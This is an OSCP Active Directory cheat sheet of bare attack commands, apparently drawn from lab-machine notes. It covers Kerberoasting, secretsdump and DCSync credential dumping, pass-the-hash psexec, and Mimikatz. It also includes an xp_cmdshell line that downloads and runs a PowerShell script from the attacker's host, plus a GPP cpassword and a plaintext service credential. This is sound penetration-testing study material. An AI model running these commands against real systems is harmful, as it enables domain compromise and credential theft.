# OSCP - Active Directory (Commands only)

## Discovery
nmap -sV -p88,135,139,389,445,464,636,3268,3269,593 TARGET
enum4linux -a DC_IP
rpcclient -U "" DC_IP
windapsearch.py -u "" --dc-ip DC_IP -U --admin-objects

## LDAP / SPN / Kerberos
impacket-GetUserSPNs -request -dc-ip DC_IP DOMAIN/USER:PASS
kerberoast -u USER -p PASS -d DOMAIN -dc-ip DC_IP
GetUserSPNs.py -request -dc-ip DC_IP DOMAIN/USER:PASS

## Bloodhound / Sharphound
bloodhound-python -u USER -p PASS -d DOMAIN -c all --zip
SharpHound.exe --CollectionMethod All

## Impacket & AD actions
impacket-secretsdump DOMAIN/USER:PASS@DC_IP
impacket-psexec DOMAIN/Administrator:HASH@TARGET
impacket-smbclient DOMAIN/USER:PASS@TARGET

## Kerberos Certificate auth
certipy-ad auth -pfx administrator.pfx -dc-ip DC_IP

## AD priv esc checks (quick)
Get-ADUser -Identity user -Properties *
Get-ADComputer -Filter * -Properties *
dsacls "DC=domain,DC=local" /S

## DCSync / ACL abuse
impacket-secretsdump -just-dc DOMAIN/USER:PASS@DC_IP
ntdsutil "ac i ntds" "ifm" "create full C:\temp"

## Useful commands seen in notes
gpp-decrypt CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ
impacket-mssqlclient mssql-svc:corporate568@MSSQL_IP -windows-auth
xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(\"http://'$KALI_IP'/shell.ps1\")"'

## Quick post-exploit
Invoke-Mimikatz -Command "lsadump::dcsync /domain:DOMAIN /all"
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects

## Sources
[Active Directory/Monteverde/notes.txt](Active Directory/Monteverde/notes.txt)
[Active Directory/Forest/notes.txt](Active Directory/Forest/notes.txt)
[Active Directory/Return/notes.txt](Active Directory/Return/notes.txt)
[Active Directory/EscapeTwo/notes.txt](Active Directory/EscapeTwo/notes.txt)
[Active Directory/Active/notes.txt](Active Directory/Active/notes.txt)
[Active Directory/Sauna/winPEAS.txt](Active Directory/Sauna/winPEAS.txt)
[Windows/Querier/notes.txt](Windows/Querier/notes.txt)
[Windows/Cascade/notes.txt](Windows/Cascade/notes.txt)
